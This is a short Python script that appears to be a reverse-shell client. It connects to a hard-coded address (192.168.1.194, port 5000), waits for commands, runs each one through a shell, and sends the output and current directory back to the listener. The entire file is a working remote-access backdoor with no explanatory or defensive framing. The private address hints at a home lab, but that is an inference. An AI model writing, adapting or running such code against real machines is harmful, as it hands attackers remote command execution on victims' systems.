import subprocess
import socket
import os



s=socket.socket()
host ="192.168.1.194"
port=5000

s.connect((host,port))

while True: 
    #Creating data checks
    data = s.recv(1024) 
    if data[:2].decode("utf-8") =='cd': #Check if the first two characters are CD
        os.chdir(data[3:].decode("utf-8")) #Rest of the characters after CD

    if len(data)>0:
        cmd = subprocess.Popen(data[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)    #Opens a proccess that will execute a statment 
        output_byte = cmd.stdout.read() + cmd.stderr.read() 
        output_str = str(output_byte,"utf-8")
        currentWD = os.getcwd()+ ">"
        s.send(str.encode(output_str+ currentWD))

    print(output_str)